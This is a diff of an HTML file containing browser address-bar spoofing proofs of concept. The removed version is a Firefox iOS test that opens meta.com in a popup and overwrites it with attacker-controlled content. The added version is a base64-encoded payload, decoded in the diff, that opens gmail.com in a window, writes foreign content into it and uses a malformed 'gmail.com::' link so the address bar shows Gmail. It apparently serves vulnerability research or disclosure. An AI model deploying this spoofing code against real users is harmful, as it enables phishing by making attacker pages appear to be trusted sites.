@@ -1,55 +1,7 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<title>Address Bar Spoofing PoC</title>
-<style>
-body { font-family: Arial; text-align:center; margin-top:80px; }
-iframe { width:90%; height:80vh; border:1px solid #ccc; }
-.note { color:red; font-size:13px; margin-bottom:10px; }
-</style>
-
-<script>
-function go() {
-    // Open trusted origin
-   var win = window.open('https://meta.com:90');
-
-    if (!win) {
-        alert("Popup blocked");
-        return;
-    }
-
-    setTimeout(function () {
-        try {
-            // Replace document with attacker content (iframe only)
-            win.document.open();
-            win.document.write(`
-                <p class="note">
-                   u think on meta.com ?,  content below is attacker-controlled.
-                </p>
-
-
-<iframe
-  src="https://ecdnts-del.github.io/spoof/TODD.jpg"
-  width="2048"
-  height="1424"
-  style="border:none;"
-></iframe>
-
-
-            `);
-            win.document.close();
-
-        } catch (e) {
-            console.log("Blocked:", e);
-        }
-    }, 3000);
-}
-</script>
-</head>
-
-<body>
-<h2>Firefox iOS Address Bar Spoofing Test</h2>
-<button onclick="go()">Start Test</button>
-</body>
-</html>
+<script> payload="PGJvZHk+PC9ib2R5Pg0KPHNjcmlwdD4NCiAgICB2YXIgbGluayA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsNCiAgICBsaW5rLmhyZWYgPSAnaHR0cHM6Ly9nbWFpbC5jb206Oic7DQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChsaW5rKTsNCiAgICBsaW5rLmNsaWNrKCk7DQo8L3NjcmlwdD4="; 
+    
+function pwned() { var t = window.open('https://www.gmail.com', 'aaaa'); t.document.write(atob(payload)); t.document.write("<h1>Address bar says https://www.gmail.com - this is NOT https://www.gmail.com</h1>"); } 
+</script> <a href="https://hack.com::/" target="aaaa"
+onclick="setTimeout('pwned()','500')">click me</a><br> 
+base64 payload code:
+<body></body> <script> var link = document.createElement('a'); link.href = 'https://gmail.com::'; document.body.appendChild(link); link.click(); </script>
